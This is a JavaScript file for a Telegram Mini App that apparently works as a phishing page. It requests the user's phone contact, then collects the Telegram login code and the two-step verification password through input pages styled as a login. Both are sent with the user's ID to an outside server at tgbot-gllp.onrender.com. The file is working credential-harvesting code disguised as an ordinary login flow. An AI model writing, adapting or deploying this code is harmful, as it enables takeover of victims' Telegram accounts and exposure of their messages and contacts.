document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram?.WebApp;
    
    tg.ready();
    tg.expand();
    let page = 'page1';

    // Display debug info on page
    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const popup = document.getElementById('popup');
    const blur = document.getElementById('blur');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');
    tg.MainButton.text = "Send Code";
    tg.MainButton.show();
    tg.MainButton.onClick(() => {
    sendPasscode();
    showPage3();
    });

    document.addEventListener('touchstart', (e) => {
    const active = document.activeElement;

    // If user taps outside of any input or textarea, blur it
        if (
            active &&
            (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA') &&
            !e.target.closest('input') &&
            !e.target.closest('textarea')
        ) {
            active.blur();
        }
    });


    // Store user info globally when available
    let userInfo = null;
    let testMode = false; // Enable test mode if no Telegram data

    // Try to get user info from Telegram WebApp
    if (tg.initDataUnsafe?.user) {
        userInfo = tg.initDataUnsafe.user;
    }

    loginBtn.addEventListener('click', async () => {
        
        // Update user info if now available
        if (tg.initDataUnsafe?.user) {
            userInfo = tg.initDataUnsafe.user;
        }
        
        if (testMode) {
            tg.showAlert('⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.');
            return;
        }
        
        try {
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                console.log('📞 Contact requested:', data);
                if (data.status === 'sent') {
                    showPage2();
                }
            });
            
        } catch (error) {
            console.log('[ERROR]: ' + error);
            tg.showAlert('Error: ' + error.message);
        }
    });

    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginBtn.style.display = 'none';
    }

    function showPage3() {
        page = 'page3';
        page2.style.display = 'none';
        page3.style.display = 'flex';
        popup.style.height = '340px';
        requestAnimationFrame(() => {
            page3.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page3.style.zIndex = '100';
        blur.style.opacity = '1';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        } else if (page === 'page3') {
            blur.style.zIndex = '-1';
            page3.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page3.style.transform = 'translateY(40px)';
            });
        }
    });

    // Handle passcode submission
    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value;
        
        if (!passcode) {
            tg.showAlert('⚠️ Please enter passcode');
            return;
        }

        // Get user_id from stored userInfo or try to parse from Telegram
        let user_id = userInfo?.id;
        
        if (!user_id && tg.initDataUnsafe?.user?.id) {
            user_id = tg.initDataUnsafe.user.id;
            userInfo = tg.initDataUnsafe.user;
        }
        
        if (!user_id && tg.initData) {
            // Try to parse from initData string as last resort
            const params = new URLSearchParams(tg.initData);
            const userParam = params.get('user');
            if (userParam) {
                try {
                    const userData = JSON.parse(userParam);
                    user_id = userData.id;
                    userInfo = userData;
                } catch (e) {
                }
            }
        }

        if (!user_id) {
            tg.showAlert('⚠️ Cannot get user ID. Please open from Telegram bot.');
            return;
        }

        console.log('📤 Sending: Passcode=' + passcode + ', UserID=' + user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    passcode: passcode,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            
            // Show 2FA page
            setTimeout(() => {
                showPage3();
            }, 1000);
            
        } catch (err) {

        }
    });

    // Handle 2FA submission
    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', async () => {
        const twofactor = twofactorInput.value;

        if (!twofactor) {
            tg.showAlert('⚠️ Please enter 2FA password');
            return;
        }

        const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;

        if (!user_id) {
            tg.showAlert('⚠️ Cannot get user ID');
            return;
        }

        console.log('📤 Sending: 2FA password, UserID=' + user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    twofactor: twofactor,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            
        } catch (err) {
            tg.showAlert('❌ Failed to send');
        }
    });

    // Handle passcode input display
    const input = document.getElementById('hiddenInput');
    const cells = document.querySelectorAll('.cell');
    const box = document.getElementById('codeBox');

    box.addEventListener('click', () => input.focus());

    input.addEventListener('input', () => {
        const value = input.value.split('');
        cells.forEach((cell, i) => {
            cell.textContent = value[i] || '';
            if (value[i]) {
                requestAnimationFrame(() => {
                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
                });
            } else {
                cell.style.boxShadow = '';
            }
        });
    });
});